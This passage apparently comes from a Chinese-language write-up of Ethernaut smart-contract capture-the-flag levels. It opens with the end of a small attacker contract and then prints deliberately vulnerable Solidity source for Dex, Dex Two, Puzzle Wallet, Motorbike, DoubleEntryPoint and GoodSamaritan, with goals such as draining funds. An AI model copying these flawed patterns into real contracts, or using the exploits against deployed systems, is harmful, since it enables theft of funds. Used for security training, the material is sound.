&#125;<br><br>  function pwn() external &#123;<br>    target.buy();<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h1 id="Dex"><a href="#Dex" class="headerlink" title="Dex"></a>Dex</h1><p>任务要求：通过价格操纵窃取资金。</p><p><strong>源代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;<br>import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;<br>import &#x27;openzeppelin-contracts-08/access/Ownable.sol&#x27;;<br><br>contract Dex is Ownable &#123;<br>  address public token1;<br>  address public token2;<br>  constructor() &#123;&#125;<br><br>  function setTokens(address _token1, address _token2) public onlyOwner &#123;<br>    token1 = _token1;<br>    token2 = _token2;<br>  &#125;<br>  <br>  function addLiquidity(address token_address, uint amount) public onlyOwner &#123;<br>    IERC20(token_address).transferFrom(msg.sender, address(this), amount);<br>  &#125;<br>  <br>  function swap(address from, address to, uint amount) public &#123;<br>    require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);<br>    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);<br>    uint swapAmount = getSwapPrice(from, to, amount);<br>    IERC20(from).transferFrom(msg.sender, address(this), amount);<br>    IERC20(to).approve(address(this), swapAmount);<br>    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);<br>  &#125;<br><br>  function getSwapPrice(address from, address to, uint amount) public view returns(uint)&#123;<br>    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));<br>  &#125;<br><br>  function approve(address spender, uint amount) public &#123;<br>    SwappableToken(token1).approve(msg.sender, spender, amount);<br>    SwappableToken(token2).approve(msg.sender, spender, amount);<br>  &#125;<br><br>  function balanceOf(address token, address account) public view returns (uint)&#123;<br>    return IERC20(token).balanceOf(account);<br>  &#125;<br>&#125;<br><br>contract SwappableToken is ERC20 &#123;<br>  address private _dex;<br>  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) &#123;<br>    _mint(msg.sender, initialSupply);<br>    _dex = dexInstance;<br>  &#125;<br><br>  function approve(address owner, address spender, uint256 amount) public &#123;<br>    require(owner != _dex, &quot;InvalidApprover&quot;);<br>    super._approve(owner, spender, amount);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h1 id="Dex-Two"><a href="#Dex-Two" class="headerlink" title="Dex Two"></a>Dex Two</h1><p>任务要求：从DexTwo合约中提取token1和token2的所有余额才能通过此题。</p><p><strong>源代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;<br>import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;<br>import &#x27;openzeppelin-contracts-08/access/Ownable.sol&#x27;;<br><br>contract DexTwo is Ownable &#123;<br>  address public token1;<br>  address public token2;<br>  constructor() &#123;&#125;<br><br>  function setTokens(address _token1, address _token2) public onlyOwner &#123;<br>    token1 = _token1;<br>    token2 = _token2;<br>  &#125;<br><br>  function add_liquidity(address token_address, uint amount) public onlyOwner &#123;<br>    IERC20(token_address).transferFrom(msg.sender, address(this), amount);<br>  &#125;<br>  <br>  function swap(address from, address to, uint amount) public &#123;<br>    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);<br>    uint swapAmount = getSwapAmount(from, to, amount);<br>    IERC20(from).transferFrom(msg.sender, address(this), amount);<br>    IERC20(to).approve(address(this), swapAmount);<br>    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);<br>  &#125; <br><br>  function getSwapAmount(address from, address to, uint amount) public view returns(uint)&#123;<br>    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));<br>  &#125;<br><br>  function approve(address spender, uint amount) public &#123;<br>    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);<br>    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);<br>  &#125;<br><br>  function balanceOf(address token, address account) public view returns (uint)&#123;<br>    return IERC20(token).balanceOf(account);<br>  &#125;<br>&#125;<br><br>contract SwappableTokenTwo is ERC20 &#123;<br>  address private _dex;<br>  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) &#123;<br>    _mint(msg.sender, initialSupply);<br>    _dex = dexInstance;<br>  &#125;<br><br>  function approve(address owner, address spender, uint256 amount) public &#123;<br>    require(owner != _dex, &quot;InvalidApprover&quot;);<br>    super._approve(owner, spender, amount);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h1 id="Puzzle-Wallet"><a href="#Puzzle-Wallet" class="headerlink" title="Puzzle Wallet"></a>Puzzle Wallet</h1><p>任务要求：</p><p><strong>源代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br>pragma experimental ABIEncoderV2;<br><br>import &quot;../helpers/UpgradeableProxy-08.sol&quot;;<br><br>contract PuzzleProxy is UpgradeableProxy &#123;<br>    address public pendingAdmin;<br>    address public admin;<br><br>    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) &#123;<br>        admin = _admin;<br>    &#125;<br><br>    modifier onlyAdmin &#123;<br>      require(msg.sender == admin, &quot;Caller is not the admin&quot;);<br>      _;<br>    &#125;<br><br>    function proposeNewAdmin(address _newAdmin) external &#123;<br>        pendingAdmin = _newAdmin;<br>    &#125;<br><br>    function approveNewAdmin(address _expectedAdmin) external onlyAdmin &#123;<br>        require(pendingAdmin == _expectedAdmin, &quot;Expected new admin by the current admin is not the pending admin&quot;);<br>        admin = pendingAdmin;<br>    &#125;<br><br>    function upgradeTo(address _newImplementation) external onlyAdmin &#123;<br>        _upgradeTo(_newImplementation);<br>    &#125;<br>&#125;<br><br>contract PuzzleWallet &#123;<br>    address public owner;<br>    uint256 public maxBalance;<br>    mapping(address =&gt; bool) public whitelisted;<br>    mapping(address =&gt; uint256) public balances;<br><br>    function init(uint256 _maxBalance) public &#123;<br>        require(maxBalance == 0, &quot;Already initialized&quot;);<br>        maxBalance = _maxBalance;<br>        owner = msg.sender;<br>    &#125;<br><br>    modifier onlyWhitelisted &#123;<br>        require(whitelisted[msg.sender], &quot;Not whitelisted&quot;);<br>        _;<br>    &#125;<br><br>    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123;<br>      require(address(this).balance == 0, &quot;Contract balance is not 0&quot;);<br>      maxBalance = _maxBalance;<br>    &#125;<br><br>    function addToWhitelist(address addr) external &#123;<br>        require(msg.sender == owner, &quot;Not the owner&quot;);<br>        whitelisted[addr] = true;<br>    &#125;<br><br>    function deposit() external payable onlyWhitelisted &#123;<br>      require(address(this).balance &lt;= maxBalance, &quot;Max balance reached&quot;);<br>      balances[msg.sender] += msg.value;<br>    &#125;<br><br>    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted &#123;<br>        require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;);<br>        balances[msg.sender] -= value;<br>        (bool success, ) = to.call&#123; value: value &#125;(data);<br>        require(success, &quot;Execution failed&quot;);<br>    &#125;<br><br>    function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123;<br>        bool depositCalled = false;<br>        for (uint256 i = 0; i &lt; data.length; i++) &#123;<br>            bytes memory _data = data[i];<br>            bytes4 selector;<br>            assembly &#123;<br>                selector := mload(add(_data, 32))<br>            &#125;<br>            if (selector == this.deposit.selector) &#123;<br>                require(!depositCalled, &quot;Deposit can only be called once&quot;);<br>                // Protect against reusing msg.value<br>                depositCalled = true;<br>            &#125;<br>            (bool success, ) = address(this).delegatecall(data[i]);<br>            require(success, &quot;Error while delegating call&quot;);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h1 id="Motorbike"><a href="#Motorbike" class="headerlink" title="Motorbike"></a>Motorbike</h1><p>任务要求：</p><p><strong>源代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br><br>pragma solidity &lt;0.7.0;<br><br>import &quot;openzeppelin-contracts-06/utils/Address.sol&quot;;<br>import &quot;openzeppelin-contracts-06/proxy/Initializable.sol&quot;;<br><br>contract Motorbike &#123;<br>    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1<br>    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;<br>    <br>    struct AddressSlot &#123;<br>        address value;<br>    &#125;<br>    <br>    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.<br>    constructor(address _logic) public &#123;<br>        require(Address.isContract(_logic), &quot;ERC1967: new implementation is not a contract&quot;);<br>        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;<br>        (bool success,) = _logic.delegatecall(<br>            abi.encodeWithSignature(&quot;initialize()&quot;)<br>        );<br>        require(success, &quot;Call failed&quot;);<br>    &#125;<br><br>    // Delegates the current call to `implementation`.<br>    function _delegate(address implementation) internal virtual &#123;<br>        // solhint-disable-next-line no-inline-assembly<br>        assembly &#123;<br>            calldatacopy(0, 0, calldatasize())<br>            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)<br>            returndatacopy(0, 0, returndatasize())<br>            switch result<br>            case 0 &#123; revert(0, returndatasize()) &#125;<br>            default &#123; return(0, returndatasize()) &#125;<br>        &#125;<br>    &#125;<br><br>    // Fallback function that delegates calls to the address returned by `_implementation()`. <br>    // Will run if no other function in the contract matches the call data<br>    fallback () external payable virtual &#123;<br>        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);<br>    &#125;<br><br>    // Returns an `AddressSlot` with member `value` located at `slot`.<br>    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) &#123;<br>        assembly &#123;<br>            r_slot := slot<br>        &#125;<br>    &#125;<br>&#125;<br><br>contract Engine is Initializable &#123;<br>    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1<br>    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;<br><br>    address public upgrader;<br>    uint256 public horsePower;<br><br>    struct AddressSlot &#123;<br>        address value;<br>    &#125;<br><br>    function initialize() external initializer &#123;<br>        horsePower = 1000;<br>        upgrader = msg.sender;<br>    &#125;<br><br>    // Upgrade the implementation of the proxy to `newImplementation`<br>    // subsequently execute the function call<br>    function upgradeToAndCall(address newImplementation, bytes memory data) external payable &#123;<br>        _authorizeUpgrade();<br>        _upgradeToAndCall(newImplementation, data);<br>    &#125;<br><br>    // Restrict to upgrader role<br>    function _authorizeUpgrade() internal view &#123;<br>        require(msg.sender == upgrader, &quot;Can&#x27;t upgrade&quot;);<br>    &#125;<br><br>    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.<br>    function _upgradeToAndCall(<br>        address newImplementation,<br>        bytes memory data<br>    ) internal &#123;<br>        // Initial upgrade and setup call<br>        _setImplementation(newImplementation);<br>        if (data.length &gt; 0) &#123;<br>            (bool success,) = newImplementation.delegatecall(data);<br>            require(success, &quot;Call failed&quot;);<br>        &#125;<br>    &#125;<br>    <br>    // Stores a new address in the EIP1967 implementation slot.<br>    function _setImplementation(address newImplementation) private &#123;<br>        require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;);<br>        <br>        AddressSlot storage r;<br>        assembly &#123;<br>            r_slot := _IMPLEMENTATION_SLOT<br>        &#125;<br>        r.value = newImplementation;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h1 id="DoubleEntryPoint"><a href="#DoubleEntryPoint" class="headerlink" title="DoubleEntryPoint"></a>DoubleEntryPoint</h1><p>任务要求：</p><p><strong>源代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>import &quot;openzeppelin-contracts-08/access/Ownable.sol&quot;;<br>import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;<br><br>interface DelegateERC20 &#123;<br>  function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);<br>&#125;<br><br>interface IDetectionBot &#123;<br>    function handleTransaction(address user, bytes calldata msgData) external;<br>&#125;<br><br>interface IForta &#123;<br>    function setDetectionBot(address detectionBotAddress) external;<br>    function notify(address user, bytes calldata msgData) external;<br>    function raiseAlert(address user) external;<br>&#125;<br><br>contract Forta is IForta &#123;<br>  mapping(address =&gt; IDetectionBot) public usersDetectionBots;<br>  mapping(address =&gt; uint256) public botRaisedAlerts;<br><br>  function setDetectionBot(address detectionBotAddress) external override &#123;<br>      usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);<br>  &#125;<br><br>  function notify(address user, bytes calldata msgData) external override &#123;<br>    if(address(usersDetectionBots[user]) == address(0)) return;<br>    try usersDetectionBots[user].handleTransaction(user, msgData) &#123;<br>        return;<br>    &#125; catch &#123;&#125;<br>  &#125;<br><br>  function raiseAlert(address user) external override &#123;<br>      if(address(usersDetectionBots[user]) != msg.sender) return;<br>      botRaisedAlerts[msg.sender] += 1;<br>  &#125; <br>&#125;<br><br>contract CryptoVault &#123;<br>    address public sweptTokensRecipient;<br>    IERC20 public underlying;<br><br>    constructor(address recipient) &#123;<br>        sweptTokensRecipient = recipient;<br>    &#125;<br><br>    function setUnderlying(address latestToken) public &#123;<br>        require(address(underlying) == address(0), &quot;Already set&quot;);<br>        underlying = IERC20(latestToken);<br>    &#125;<br><br>    /*<br>    ...<br>    */<br><br>    function sweepToken(IERC20 token) public &#123;<br>        require(token != underlying, &quot;Can&#x27;t transfer underlying token&quot;);<br>        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));<br>    &#125;<br>&#125;<br><br>contract LegacyToken is ERC20(&quot;LegacyToken&quot;, &quot;LGT&quot;), Ownable &#123;<br>    DelegateERC20 public delegate;<br><br>    function mint(address to, uint256 amount) public onlyOwner &#123;<br>        _mint(to, amount);<br>    &#125;<br><br>    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner &#123;<br>        delegate = newContract;<br>    &#125;<br><br>    function transfer(address to, uint256 value) public override returns (bool) &#123;<br>        if (address(delegate) == address(0)) &#123;<br>            return super.transfer(to, value);<br>        &#125; else &#123;<br>            return delegate.delegateTransfer(to, value, msg.sender);<br>        &#125;<br>    &#125;<br>&#125;<br><br>contract DoubleEntryPoint is ERC20(&quot;DoubleEntryPointToken&quot;, &quot;DET&quot;), DelegateERC20, Ownable &#123;<br>    address public cryptoVault;<br>    address public player;<br>    address public delegatedFrom;<br>    Forta public forta;<br><br>    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) &#123;<br>        delegatedFrom = legacyToken;<br>        forta = Forta(fortaAddress);<br>        player = playerAddress;<br>        cryptoVault = vaultAddress;<br>        _mint(cryptoVault, 100 ether);<br>    &#125;<br><br>    modifier onlyDelegateFrom() &#123;<br>        require(msg.sender == delegatedFrom, &quot;Not legacy contract&quot;);<br>        _;<br>    &#125;<br><br>    modifier fortaNotify() &#123;<br>        address detectionBot = address(forta.usersDetectionBots(player));<br><br>        // Cache old number of bot alerts<br>        uint256 previousValue = forta.botRaisedAlerts(detectionBot);<br><br>        // Notify Forta<br>        forta.notify(player, msg.data);<br><br>        // Continue execution<br>        _;<br><br>        // Check if alarms have been raised<br>        if(forta.botRaisedAlerts(detectionBot) &gt; previousValue) revert(&quot;Alert has been triggered, reverting&quot;);<br>    &#125;<br><br>    function delegateTransfer(<br>        address to,<br>        uint256 value,<br>        address origSender<br>    ) public override onlyDelegateFrom fortaNotify returns (bool) &#123;<br>        _transfer(origSender, to, value);<br>        return true;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h1 id="GoodSamaritan"><a href="#GoodSamaritan" class="headerlink" title="GoodSamaritan"></a>GoodSamaritan</h1><p>任务要求：拿走所有的钱。</p><p><strong>源代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity &gt;=0.8.0 &lt;0.9.0;<br><br>import &quot;openzeppelin-contracts-08/utils/Address.sol&quot;;<br><br>contract GoodSamaritan &#123;<br>    Wallet public wallet;<br>    Coin public coin;<br><br>    constructor() &#123;<br>        wallet = new Wallet();<br>        coin = new Coin(address(wallet));<br><br>        wallet.setCoin(coin);<br>    &#125;<br><br>    function requestDonation() external returns(bool enoughBalance)&#123;<br>        // donate 10 coins to requester<br>        try wallet.donate10(msg.sender) &#123;<br>            return true;<br>        &#125; catch (bytes memory err) &#123;<br>            if (keccak256(abi.encodeWithSignature(&quot;NotEnoughBalance()&quot;)) == keccak256(err)) &#123;<br>                // send the coins left<br>                wallet.transferRemainder(msg.sender);<br>                return false;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br>contract Coin &#123;<br>    using Address for address;<br><br>    mapping(address =&gt; uint256) public balances;<br><br>    error InsufficientBalance(uint256 current, uint256 required);<br><br>    constructor(address wallet_) &#123;<br>        // one million coins for Good Samaritan initially<br>        balances[wallet_] = 10**6;<br>    &#125;<br><br>    function transfer(address dest_, uint256 amount_) external &#123;<br>        uint256 currentBalance = balances[msg.sender];<br><br>        // transfer only occurs if balance is enough<br>        if(amount_ &lt;= currentBalance) &#123;<br>            balances[msg.sender] -= amount_;<br>            balances[dest_] += amount_;<br><br>            if(dest_.isContract()) &#123;<br>                // 